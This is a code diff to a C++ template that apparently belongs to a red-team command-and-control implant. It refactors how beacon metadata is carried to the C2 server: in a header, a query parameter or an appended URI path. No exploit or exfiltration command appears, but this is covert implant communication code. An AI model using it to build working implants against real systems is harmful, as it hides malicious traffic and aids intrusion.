@@ -73,41 +73,45 @@ nlohmann::json get(std::string implant_uuid) {
     [%- endfor %]
     // --- end ---
 
+
+    //where to store metadata - note, could macro this?
+    //key, ex, header
+
+
     [# HTTP_GET: METADATA: HEADER - IF MC2 says it wants a header for where to find the metadata... #]
     [%- if http_get_client_metadata_terminator == "header" %]
-    {
-        std::wstring key = L"[[ http_get_client_metadata_terminator_value ]]";
-        headers.push_back(key + L": " + w_metadata);
-    }
+    
+    headers.push_back(L"[[http_get_client_metadata_terminator_value]]" + L": " + w_metadata);
+    
     [%- endif %]
 
     [# HTTP_GET: METADATA: PARAMETER - IF MC2 says it wants a header for where to find the metadata... #]
     [#(e.g., /search?q=BASE64...)#]
     [%- if http_get_client_metadata_terminator == "parameter" %]
-    {
-        // Append '?' or '&' depending on existing query string
-        if (uri.find(L'?') != std::wstring::npos) {
-            uri += L"&";
-        } else {
-            uri += L"?";
-        }
 
-        uri += key;
-        uri += L"=";
-        uri += w_metadata;
+    // Append '?' or '&' depending on existing query string
+    if (uri.find(L'?') != std::wstring::npos) {
+        uri += L"&";
+    } else {
+        uri += L"?";
     }
+
+    uri += L"[[http_get_client_metadata_terminator_value]]";
+    uri += L"=";
+    uri += w_metadata;
+
     [%- endif %]
 
     [# HTTP_GET: METADATA: URI - IF MC2 says it wants a header for where to find the metadata... #]
-    [%- if http_get_client_metadata_terminator == "uri" %]
-    {
-        //TODO: check if `/` at last char, if not, add one.
-        if (!uri.empty() && uri.back() != '/') {
-            uri.push_back('/');
-        }
-        //could use append from transform here too
-        uri += w_metadata;
+    [%- if http_get_client_metadata_terminator == "uri-append" %]
+
+    //TODO: check if `/` at last char, if not, add one.
+    if (!uri.empty() && uri.back() != '/') {
+        uri.push_back('/');
     }
+    //could use append from transform here too
+    uri += w_metadata;
+
     [%- endif %]
 
 
@@ -116,9 +120,9 @@ nlohmann::json get(std::string implant_uuid) {
     [# put in body 
     TLDR: NULL or none if no data, so pass that if not set here.
     #]
-    {
-        std::string request_body = w_metadata;
-    }
+    
+    //convert back to string for HTTP_GET function
+    request_body.assign(w_metadata.begin(), w_metadata.end());
     [%- endif %]
 
     // --- End Malleable C2 Metadata transport method ---
